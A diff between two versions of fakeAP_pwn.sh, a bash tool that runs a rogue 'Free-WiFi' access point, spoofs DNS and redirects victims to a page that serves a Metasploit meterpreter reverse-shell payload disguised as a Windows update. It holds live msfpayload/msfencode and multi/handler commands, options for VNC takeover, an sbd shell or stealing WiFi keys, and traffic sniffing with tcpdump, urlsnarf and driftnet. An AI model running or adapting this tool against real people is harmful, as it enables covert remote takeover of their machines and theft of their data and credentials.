@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 #----------------------------------------------------------------------------------------------#
-#fakeAP_pwn.sh v0.3 (Beta-#97 2010-09-02)                                                      #
+#fakeAP_pwn.sh v0.3 (#101 2010-09-03)                                                          #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -29,7 +29,7 @@ monitorInterface="mon0"
 
 # WiFi Name & Channel to use
 ESSID="Free-WiFi"
-fakeAPchannel="1"
+channel="1"
 
 # [airbase-ng/hostapd] What software to use for the FakeAP
 apType="airbase-ng"
@@ -38,13 +38,13 @@ apType="airbase-ng"
 mode="transparent"
 
 # [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
-payload="wkv"
+payload="vnc"
 backdoorPath="/root/backdoor.exe"
 
 # The directory location to the crafted web page.
 www="/var/www/fakeAP_pwn"
 
-# If your having "timing out" problems, change this.
+# If you're having "timing out" problems, change this.
 mtu="1500"
 
 # [true/false] Respond to every WiFi probe request? true = yes, false = no (only for airbase-ng, we can use karma patches for hostapd)
@@ -65,9 +65,9 @@ verbose="0"
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="10.0.0.1"
      port=$(shuf -i 2000-65000 -n 1) # Random port each time
-  version="0.3 (Beta-#97)"           # Version
+  version="0.3 (#101)"               # Version
       www="${www%/}"                 # Remove trailing slash
-    debug="false"                    # Windows dont close, shows extra stuff
+    debug="false"                    # Windows don't close, shows extra stuff
   logFile="fakeAP_pwn.log"           # filename of output
      path=""                         # null the value
   command=""                         # null the value
@@ -111,7 +111,7 @@ function cleanup() { # cleanup mode ************* DOESN'T READ VALUES CORRECTY -
       if [ "$apType" == "airbase-ng" ] ; then
          command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
          if [ "$command" == "$monitorInterface" ] ; then
-            sleep 3 # Some times it needs to catch up/wait
+            sleep 3 # Sometimes it needs to catch up/wait
             action "Monitor Mode (Stopping)" "airmon-ng stop $monitorInterface" $verbose $diagnostics "true"
          fi
       fi
@@ -136,52 +136,62 @@ function help() {
               -y [airbase-ng/hostapd] -m [normal/transparent/non] -p [sbd/vnc/other] -b [/path]
               -h [/path] -q [MTU] -r (-z / -a [mac address]) -e -d -v -V [-u] [-?]
 
- Common options:
-   -i  ---  Internet Interface (which inferface to use - check with ifconfig)  e.g. eth0
-   -w  ---  WiFi Interface (which inferface to use - check with ifconfig)  e.g. wlan0
-   -t  ---  Monitor Interface (which inferface to use - check with ifconfig)  e.g. mon0
+ Options:
+   -i  ---  Internet Interface e.g. $interface
+   -w  ---  WiFi Interface     e.g. $wifiInterface
+   -t  ---  Monitor Interface  e.g. $monitorInterface
 
-   -e  ---  WiFi Name e.g. Free-WiFi
-   -c  ---  Set the channel for the FakeAP to run on e.g. 6
+   -e  ---  ESSID (WiFi Name) e.g. $ESSID
+   -c  ---  Channel for the Acess Point e.g. $channel
 
-[*]-y  ---  airbase-ng/hostapd. What software to use for the FakeAP
+   -y  ---  What software to use e.g. airbase-ng/hostapd
 
-   -m  ---  Mode normal/transparent/non/flip e.g. transparent
+   -m  ---  Mode. How should the access point behave
+             e.g. normal/transparent/non/flip
 
-   -p  ---  Payload (sbd/vnc/wkv/other) e.g. vnc
-   -b  ---  Backdoor Path (only used when payload is set to other) e.g. /path/to/backdoor.exe
+   -p  ---  Payload. What do you want to do to the target
+             e.g. sbd/vnc/wkv/other
+   -b  ---  Backdoor Path (only used when payload is set to other)
+             e.g. /path/to/backdoor.exe
 
-   -h  ---  htdocs path e.g. $www
-   -q  ---  Maximum Transmission Unit - If your having timing out problems, change this. e.g. 1500
+   -h  ---  htdocs (www) path e.g. $www
+   -q  ---  Maximum Transmission Unit. e.g. $mtu
    -r  ---  Respond to every probe request
 
    -z  ---  Randomizes the MAC Address of the FakeAP
    -a  ---  Use this MAC Address. e.g. 00:05:7c:9a:58:3f
 
-[*]-x  ---  Does a few \"extra\" things after target is infected.
+   -x  ---  Does a few \"extra\" things after target is infected.
 
-   -d  ---  Diagnostics Mode (Creates output file, $logFile)
-   -v  ---  Verbose mode          (Displays infomation)
-   -V  ---  (Higher) Verbose mode (Displays infomation + commands)
+   -d  ---  Diagnostics      (Creates output file, $logFile)
+   -v  ---  Verbose          (Displays more)
+   -V  ---  (Higher) Verbose (Displays more + shows commands)
 
-   -u  ---  Update fakeAP_pwn
+   -u  ---  Update
 
-   -?  ---  This screen
+   -?  ---  This
+
+
 
  Known issues:
    -\"Odd\" SSID
-        > Airbase-ng has a few bugs... Re-run the script.
+        > Airbase-ng doesn't always work ...Re-run the script.
         > Try hostap
+
    -Can't connect
-        > Airbase-ng has a few bugs... Re-run the script. (Try with -v this time)
+        > Airbase-ng doesn't always work ...Re-run the script.
         > Try hostap
+        > Target is too close/far away
+        > Window 7 connects better than Windows XP
+
    -No IP
         > Use latest version of dhcp3-server
+
    -Slow
-        > Don't use a virtual machine
-        > Your hardware - 802.11n doesn't work too well!
+        > Don't use in a virtual machine
         > Try hostap
         > Try a different MTU value.
+        > Your hardware (Example, 802.11n doesn't work too well)
 "
    exit 1
 }
@@ -298,24 +308,22 @@ function ipTables() { #ipTables mode $verbose $diagnostics $apInterface $interfa
          iptables --table nat --append PREROUTING --in-interface $4 -p tcp --destination-port 80  --jump DNAT --to 10.0.0.1:80 ;
          iptables --table nat --append PREROUTING --in-interface $4 -p tcp --destination-port 443 --jump DNAT --to 10.0.0.1:80 ;
          iptables --table nat --append PREROUTING --in-interface $5 -p tcp -j REDIRECT"
+
       elif [ "$1" == "transparent" ]  ; then
          ipTables clear $verbose $diagnostics
          # iptables -P INPUT DROP ;
-         command=" iptables -P OUTPUT ACCEPT ;
+         command="iptables -P OUTPUT ACCEPT ;
 
          iptables --append INPUT  --in-interface lo  --jump ACCEPT ;
          iptables --append OUTPUT --out-interface lo --jump ACCEPT ;
 
-         iptables --append INPUT -i $5 -m state --state ESTABLISHED,RELATED --jump ACCEPT ;
+         iptables --append INPUT --in-interface $5 -m state --state ESTABLISHED,RELATED --jump ACCEPT ;
 
          iptables --table nat --append POSTROUTING --out-interface $5 --jump MASQUERADE ;
          iptables             --append FORWARD     --in-interface $4  --jump ACCEPT ;
 
          iptables --append INPUT  --in-interface $4  --jump ACCEPT ;
-         iptables --append OUTPUT --out-interface $4 --jump ACCEPT ;
-
-         iptables --append INPUT --jump LOG ;
-         iptables --append INPUT --jump DROP"
+         iptables --append OUTPUT --out-interface $4 --jump ACCEPT"
       elif [ "$1" == "squid" ]  ; then
          ipTables transparent $verbose $diagnostics $apInterface $interface $gatewayIP
          command="
@@ -350,7 +358,7 @@ while getopts "i:w:t:e:c:y:m:p:b:h:q:rz:a:xdvVu?" OPTIONS; do
       w   ) export wifiInterface=$OPTARG;;
       t   ) export monitorInterface=$OPTARG;;
       e   ) export ESSID=$OPTARG;;
-      c   ) export fakeAPchannel=$OPTARG;;
+      c   ) export channel=$OPTARG;;
       y   ) export apType=$OPTARG;;
       m   ) export mode=$OPTARG;;
       p   ) export payload=$OPTARG;;
@@ -404,7 +412,7 @@ if [ "$command" != "" ] ; then action "Removing old files" "rm -rfv $command" $v
 
 if [ "$ESSID" == "" ] ; then display error "ESSID can't be blank" $diagnostics 1>&2; cleanup; fi
 if [ "$wifiInterface" == "" ] ; then display error "wifiInterface can't be blank" $diagnostics 1>&2; cleanup; fi
-if [ "$fakeAPchannel" == "" ] ; then display error "fakeAPchannel can't be blank" $diagnostics 1>&2; cleanup; fi
+if [ "$channel" == "" ] ; then display error "channel can't be blank" $diagnostics 1>&2; cleanup; fi
 if [ "$apType" == "airbase-ng" ] && [ "$monitorInterface" == "" ] ; then display error "monitorInterface ($monitorInterface) isn't correct" $diagnostics 1>&2; cleanup; fi
 if [ "$apType" == "" ] || [ "$apType" != "airbase-ng" ] && [ "$apType" != "hostapd" ] ; then display error "apType ($apType) isn't correct" $diagnostics 1>&2; cleanup; fi
 if [ "$payload" == "" ] || [ "$payload" != "sbd" ] && [ "$payload" != "vnc" ] && [ "$payload" != "wkv" ] && [ "$payload" != "other" ] ; then display error "payload ($payload) isn't correct" $diagnostics 1>&2; cleanup; fi
@@ -450,7 +458,7 @@ if [ "$diagnostics" == "true" ] ; then
  monitorInterface=$monitorInterface
       apInterface=$apInterface
             ESSID=$ESSID
-    fakeAPchannel=$fakeAPchannel
+          channel=$channel
            apType=$apType
              mode=$mode
           payload=$payload
@@ -500,7 +508,7 @@ if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then
 \e[01;33m[i]\e[00m monitorInterface=$monitorInterface
 \e[01;33m[i]\e[00m      apInterface=$apInterface
 \e[01;33m[i]\e[00m            ESSID=$ESSID
-\e[01;33m[i]\e[00m    fakeAPchannel=$fakeAPchannel
+\e[01;33m[i]\e[00m          channel=$channel
 \e[01;33m[i]\e[00m           apType=$apType
 \e[01;33m[i]\e[00m             mode=$mode
 \e[01;33m[i]\e[00m          payload=$payload
@@ -712,7 +720,7 @@ if [ "$extras" == "true" ] ; then
 fi
 
 if [ "$mode" != "non" ] ; then
-   action "Resetting interface" "ifconfig $interface up && sleep 1" $verbose $diagnostics "true" #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you dont have DHCP
+   action "Resetting interface" "ifconfig $interface up && sleep 1" $verbose $diagnostics "true" #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you don't have DHCP
    command=$(ifconfig | grep -q -o "$interface")
    if [ ! $command == "" ] ; then display error "$interface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
    command=$(ifconfig | grep $interface | awk '{print $1}')
@@ -730,7 +738,7 @@ if [ "$mode" != "non" ] ; then
          display error "IP Problem. Haven't got an IP address on $interface." $diagnostics 1>&2
          pidcheck=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
          if [ -n "$pidcheck" ] ; then
-            kill $pidcheck # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
+            kill $pidcheck
          fi
          display info "Switching mode to: non (No Internet access after infection)" $diagnostics
          mode="non"
@@ -1101,10 +1109,10 @@ print_status(\"-------------------------------------------\")" >> $path
    if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
 fi
 if [ "$mode" == "flip" ] ; then
-   path="/tmp/fakeAP_pwn.pl"
-   if [ -e "$path" ] ; then rm "$path" ; fi # Squid script
-# fakeAP_pwn.pl v$version
+   path="/tmp/fakeAP_pwn.pl" # Squid script
+   if [ -e "$path" ] ; then rm "$path" ; fi
    echo -e "#!/usr/bin/perl
+# fakeAP_pwn.pl v$version
 $|=1;
 \$count = 0;
 \$pid = \$\$;
@@ -1147,8 +1155,8 @@ while (<>) {
    if [ "$debug" == "true" ] ; then cat "$path"; fi
    if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
 
-   path="/tmp/fakeAP_pwn.squid"
-   if [ -e "$path" ] ; then rm "$path" ; fi # Squid config
+   path="/tmp/fakeAP_pwn.squid" # Squid config
+   if [ -e "$path" ] ; then rm "$path" ; fi
    echo '# fakeAP_pwn.squid v$version
 hierarchy_stoplist cgi-bin ?
 acl QUERY urlpath_regex cgi-bin \?
@@ -1200,10 +1208,6 @@ acl apache rep_header Server ^Apache
 broken_vary_encoding allow apache
 extension_methods REPORT MERGE MKACTIVITY CHECKOUT
 coredump_dir /var/spool/squid' >> $path
-# icp_port 3130
-#icp_port 0
-#dns_nameservers 10.0.0.1
-#cache_mem 1024 MB
    if [ "$verbose" == "2" ]  ; then echo "Created: $path"; fi
    if [ "$debug" == "true" ] ; then cat "$path"; fi
    if [ ! -e $path ] ; then display error "Couldn't create $path" $diagnostics 1>&2; cleanup; fi
@@ -1334,7 +1338,7 @@ ctrl_interface=/var/run/hostapd
 ctrl_interface_group=0
 ssid=$ESSID
 hw_mode=g
-channel=$fakeAPchannel
+channel=$channel
 beacon_int=100
 dtim_period=2
 max_num_sta=255
@@ -1390,7 +1394,7 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
    #command="/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -e x86/countdown -c 2 -t raw | /opt/metasploit3/bin/msfencode -e x86/shikata_ga_nai -c 5 -t raw | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $www/Windows-KB183905-x86-ENU.exe"
    #command="/opt/metasploit3/bin/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x64-ENU.exe" # x64 bit!
    action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x $www/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
-#action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
+   #action "Metasploit (Windows)" "/opt/metasploit3/bin/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | /opt/metasploit3/bin/msfencode -x /pentest/windows-binaries/tools/tftpd32.exe -t exe -e x86/shikata_ga_nai -c 10 -o $www/Windows-KB183905-x86-ENU.exe" $verbose $diagnostics "true"
    sleep 1
    if [ ! -e "$www/Windows-KB183905-x86-ENU.exe" ] ; then display error "Failed: Couldn't create exploit" $diagnostics 1>&2; cleanup; fi
 fi
@@ -1403,12 +1407,12 @@ if [ "$apType" == "airbase-ng" ] ; then
    for i in {1..3} ; do # Main Loop
       killall airbase-ng 2>/dev/null # Start fresh
       sleep 1
-      command="airbase-ng -a $macAddress -W 0 -c $fakeAPchannel -e \"$ESSID\"" # taken out y (try w,a)
+      command="airbase-ng -a $macAddress -W 0 -c $channel -e \"$ESSID\"" # taken out y (try w,a)
       if [ "$respond2All" == "true" ] ; then command="$command -P -C 60"; fi
       if [ "$debug" == "true" ] || [ "$verbose" != "0" ] ; then command="$command -v"; fi
-      action "Access Point" "$command $monitorInterface" $verbose $diagnostics "true" "0|0|4" & # Dont wait, do the next command
+      action "Access Point" "$command $monitorInterface" $verbose $diagnostics "true" "0|0|4" & # Don't wait, do the next command
       sleep 3
-      ifconfig $apInterface up                                       # The new FakeAP interface
+      ifconfig $apInterface up                                       # The new ap interface
       command=$(ifconfig -a | grep $apInterface | awk '{print $1}')
       if [ "$command" != "$apInterface" ] ; then
          display error "Couldn't create the access point's interface." $diagnostics 1>&2
@@ -1416,7 +1420,7 @@ if [ "$apType" == "airbase-ng" ] ; then
          #if [ "$diagnostics" != "true" ] || [ "$debug" != "true" ]  ; then loopMain="True"; break; fi  # Not in the correct mode
          #if [ "$mode" == "non" ] ; then loopMain="non"; break; fi                 # Not using $interface therefore can't test.
          command=$(iwconfig $interface 2>/dev/null | grep "802.11" | cut -d" " -f1)
-         if [ ! $command ]; then loopMain="True"; break; fi                          # $interface isnt WiFi, therefore can't test.
+         if [ ! $command ]; then loopMain="True"; break; fi                          # $interface isn't WiFi, therefore can't test.
          display diag "Attempt #$i to detect the 'fake' access point." $diagnostics
          loopSub="False"
          x="1"
@@ -1448,7 +1452,7 @@ if [ "$apType" == "airbase-ng" ] ; then
       display error "Couldn't detect the 'fake' access point." $diagnostics 1>&2
    fi
 elif [ "$apType" == "hostapd" ] ; then
-   action "'Fake' Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" $verbose $diagnostics "true" "0|0|4" & # Dont wait, do the next command
+   action "'Fake' Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" $verbose $diagnostics "true" "0|0|4" & # Don't wait, do the next command
    sleep 3
    if [ -z "$(pgrep hostapd)" ] ; then
       display error "hostapd failed to start." $diagnostics 1>&2
@@ -1493,7 +1497,7 @@ display action "Starting: DHCP" $diagnostics
 if [ -e "/etc/apparmor.d/usr.sbin.dhcpd3" ] ; then command="dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf $apInterface"
 else command="dhcpd3 -d -f -cf /tmp/fakeAP_pwn.dhcp $apInterface" ;
 fi
-action "DHCP" "$command" $verbose $diagnostics "true" "0|75|5" & # -d = logging, -f = forground # Dont wait, do the next command
+action "DHCP" "$command" $verbose $diagnostics "true" "0|75|5" & # -d = logging, -f = forground # Don't wait, do the next command
 sleep 2
 if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
    display error "DHCP server failed to start." $diagnostics 1>&2
@@ -1502,19 +1506,15 @@ if [ -z "$(pgrep dhcpd3)" ] ; then # check if dhcpd3 server is running
 fi
 
 #----------------------------------------------------------------------------------------------#
-if [ "$mode" != "normal" ] ; then
+if [ "$mode" != "normal" ] && [ "$mode" != "flip" ] ; then
    display action "Starting: DNS" $diagnostics
-   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" "0|165|5" & # Dont wait, do the next command
+   action "DNS" "dnsspoof -i $apInterface -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" "0|165|5" & # Don't wait, do the next command
    sleep 2
 fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$mode" != "normal" ] &&  [ "$mode" != "flip" ] ; then
    display action "Starting: Metasploit" $diagnostics
-   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
-   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
-   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
-   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
    command=$(netstat -ltpn | grep 4565)
    if [ "$command" != "" ] ; then
       display error "Port 4564 isn't free." $diagnostics 1>&2 ;
@@ -1524,7 +1524,11 @@ if [ "$mode" != "normal" ] &&  [ "$mode" != "flip" ] ; then
       command=$(netstat -ltpn | grep 4565)
       if [ "$command" != "" ] ; then display error "Couldn't free port 4564." $diagnostics 1>&2 ; cleanup; fi # Kill it for them?
    fi
-   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" $verbose $diagnostics "true" "0|255|15" & #ExitOnSession=false # Dont wait, do the next command
+   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E"; fi
+   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=linux/x86/metsvc_reverse_tcp_tcp LHOST=10.0.0.1 LPORT=4566 AutoRunScript=/tmp/fakeAP_pwn-osx.rb E" &
+   #if [ "$verbose" == "2" ] ; then echo "Command: /opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E"; fi
+   #$xterm -geometry 75x15+10+215 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 AutoRunScript=/tmp/fakeAP_pwn-linux.rb E" &
+   action "Metasploit (Windows)" "/opt/metasploit3/bin/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 AutoRunScript=/tmp/fakeAP_pwn.rb INTERFACE=$apInterface E" $verbose $diagnostics "true" "0|255|15" & #ExitOnSession=false # Don't wait, do the next command
    sleep 5 # Need to wait for metasploit, so we have an exploit ready for the target to download
    if [ -z "$(pgrep ruby)" ] ; then
       display error "Metaspliot failed to start." $diagnostics 1>&2
@@ -1556,7 +1560,7 @@ if [ "$mode" != "normal" ] ; then
       mv -f "server.key" "/etc/ssl/private/ssl-cert-snakeoil.key"
       mv -f "server.pem" "/etc/ssl/certs/ssl-cert-snakeoil.pem"
    fi
-   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" $verbose $diagnostics "true" & #dissable all sites and only enable the fakeAP_pwn one # Dont wait, do the next command
+   action "Web Sever" "/etc/init.d/apache2 start && ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeAP_pwn && a2enmod ssl && a2enmod php5 && /etc/init.d/apache2 reload" $verbose $diagnostics "true" & #dissable all sites and only enable the fakeAP_pwn one # Don't wait, do the next command
    sleep 2
    if [ -z "$(pgrep apache2)" ] ; then
       display error "Apache2 failed to start." $diagnostics 1>&2
@@ -1581,17 +1585,17 @@ if [ "$mode" != "normal" ] && [ "$mode" != "flip" ]; then
 #----------------------------------------------------------------------------------------------#
    if [ "$payload" == "vnc" ] ; then
       display action "Configuring: VNC" $diagnostics
-      action "VNC" "vncviewer -listen" $verbose $diagnostics "true" "0|565|10" & # Dont wait, do the next command
+      action "VNC" "vncviewer -listen -compresslevel 4 -quality 4" $verbose $diagnostics "true" "0|565|10" & # Don't wait, do the next command
    elif [ "$payload" == "sbd" ] ; then
       display action "Configuring: SBD" $diagnostics
-      action "SBD" "sbd -l -k g0tmi1k -p $port" $verbose $diagnostics "true" "0|565|10" & # Dont wait, do the next command
+      action "SBD" "sbd -l -k g0tmi1k -p $port" $verbose $diagnostics "true" "0|565|10" & # Don't wait, do the next command
       sleep 1
    fi
 
 #----------------------------------------------------------------------------------------------#
    if [ "$debug" == "true" ] || [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] ; then
       display action "Monitoring connections" $diagnostics
-      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "false" "0|475|5" & # Dont wait, do the next command
+      action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "false" "0|475|5" & # Don't wait, do the next command
    fi
    display info "Waiting for the target to run the \"update\" file" $diagnostics # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
    if [ -e "/tmp/fakeAP_pwn.lock" ] ; then rm -r "/tmp/fakeAP_pwn.lock" ; fi
@@ -1633,10 +1637,10 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 if [ "$extras" == "true" ] ; then
-   display action "Caputuring: infomation from the target" $diagnostics
-   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" $verbose $diagnostics "true" 650 640 10 & # Dump all trafic into a file # Dont wait, do the next command
-   action "URLs" "urlsnarf -i $apInterface" $verbose $diagnostics "true" "0|0|10" & # URLs # Dont wait, do the next command
-   action "Images" "driftnet -i $apInterface" $verbose $diagnostics "true" "0|465|10" & # Dont wait, do the next command
+   display action "Caputuring: information from the target" $diagnostics
+   action "tcpdump" "tcpdump -i $apInterface -w /tmp/fakeAP_pwn.cap" $verbose $diagnostics "true" 650 640 10 & # Dump all trafic into a file # Don't wait, do the next command
+   action "URLs" "urlsnarf -i $apInterface" $verbose $diagnostics "true" "0|0|10" & # URLs # Don't wait, do the next command
+   action "Images" "driftnet -i $apInterface" $verbose $diagnostics "true" "0|465|10" & # Don't wait, do the next command
    #ipTables sslstrip $verbose $diagnostics
    #command="sslstrip -k -f -l 10000 -w /tmp/fakeAP_pwn.ssl"
    #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> $logFile; fi
@@ -1671,28 +1675,27 @@ cleanup clean
 
 
 #---Roadmap------------------------------------------------------------------------------------#
-# v0.4 - Multiple clients - Each time a new client connects they will be redirected to our     #
-#                           crafted page without affecting any other clients who are browsing  #
-# v0.4 - Firewall Rules   - Don't expose local machines from the internet interface            #
-# v0.5 - Java exploit     - Different "delivery system" ;)                                     #
-# v0.6 - Linux/OSX/x64    - Make compatible                                                    #
-# v0.7 - Clone AP         - Copies SSID & BSSID then kick all connected clients                #
-# v0.8 - S.E.T.           - Fun with "Social Engineering Toolkit"                              #
+# v0.4 - Multiple clients       - Each time a new client connects they will be redirected to our
+#                                  crafted page without affecting any other clients who are browsing
+# v0.4 - Firewall Rules         - Don't expose local machines from the internet interface
+# v0.5 - Java exploit           - Different "delivery system" ;)
+# v0.6 - Linux/OSX/x64          - Make compatible
+# v0.7 - Clone AP               - Copies SSID & BSSID aftwards kicks connected client(s)
+# v0.8 - S.E.T. & karmetasploit - Use "Social Engineering Toolkit" and or karmetasploit
 #---Ideas--------------------------------------------------------------------------------------#
-# Monitor traffic that isn't on port 80 before they download the payload
-# Use vnc.rb in metasploit
-# Not sure if MTU is working correctly
-# Beep on connected client
-# "spy"
-# Check for other monitor inferfaces?
-# Add a repo that has all the software in?
-# Check ALL extra programs
-# replace exe, kill, cookie, inject, redirect
-# vnc check?
-# generate index php & vnc.reg
-# enbed png images
-# downoad missing files
-# port check
-# Update airbase/airbase-ng and or startup
-# monitor mode enabled on
-# netsh advfirewall firewall add rule name="allow TightVNC" dir=in program="C:\\winvnc.exe" security=authenticate action=allow
+# Add: Beep on connected client
+# Add: Check 'extra' programs
+# Add: Download missing files
+# Add: Generate index php, vnc.reg & embed images
+# Add: Monitor traffic that isn't on port 80 before they download the payload
+# Add: New modes - replace exe, kill, cookie, inject, redirect
+# Add: Port check
+# Add: Repo that has all the software in
+# Add: Update airbase/airbase-ng & Update at start-up
+# Add: VNC "spy" option
+# Check: Monitor interface from "monitor mode enabled on xxx"
+# Check: MTU
+# Check: other monitor interfaces
+# Check: VNC
+# Use: netsh advfirewall firewall add rule name="allow TightVNC" dir=in program="C:\\winvnc.exe" security=authenticate action=allow
+# Use: vnc.rb in metasploit?
